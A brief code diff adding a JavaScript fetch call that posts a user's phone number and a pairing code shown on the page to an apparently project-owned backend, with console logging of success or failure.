@@ -129,6 +129,19 @@
         feather.replace();
       }, 1200);
     });
+      // Send to backend
+  fetch('https://genesis-pair-backend.onrender.com/api/pair', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ number: phone, code: code })
+  }).then(res => {
+    if (!res.ok) throw new Error('Failed to save code')
+    console.log('✅ Code saved')
+  }).catch(err => {
+    console.error('❌ Failed to send to backend', err)
+  })
 
     // Copy to clipboard + feedback
     document.getElementById('pairCode').addEventListener('click', () => {
